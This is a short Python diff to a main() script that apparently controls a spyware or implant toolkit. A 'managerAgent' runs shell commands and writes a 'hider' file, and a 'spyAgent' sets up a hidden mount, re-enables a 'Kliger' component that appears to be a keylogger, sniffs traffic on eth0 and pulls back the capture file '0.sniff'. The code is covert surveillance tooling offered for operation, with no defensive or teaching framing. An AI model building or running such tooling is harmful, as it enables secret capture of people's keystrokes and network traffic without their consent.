@@ -43,6 +43,8 @@ def main():
 
     manegerAgent: Agent = op.managerAgent
 
+    print(manegerAgent.run_bash("ls"))
+
     print(
         manegerAgent.write_file(
             "hider",
@@ -64,13 +66,13 @@ def main():
     spyAgent: Agent = op.spyAgent
 
     print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
-    # kligPar = Params()
-    # kligPar.kligP = kligPrams(40)
-    # kligP = ContParams(KligerType, kligPar)
-    # print(spyAgent.runContraption(kligP, 10))
-    # sleep(20)
-    # print(spyAgent.haltContraption(10))
-    sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
+    kligPar = Params()
+    kligPar.kligP = kligPrams(40)
+    kligP = ContParams(KligerType, kligPar)
+    print(spyAgent.runContraption(kligP, 10))
+    sleep(20)
+    print(spyAgent.haltContraption(10))
+    sniffP = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
     print(spyAgent.runContraption(sniffP, 10))
     sleep(30)
     print(spyAgent.retrieve_file("0.sniff"))
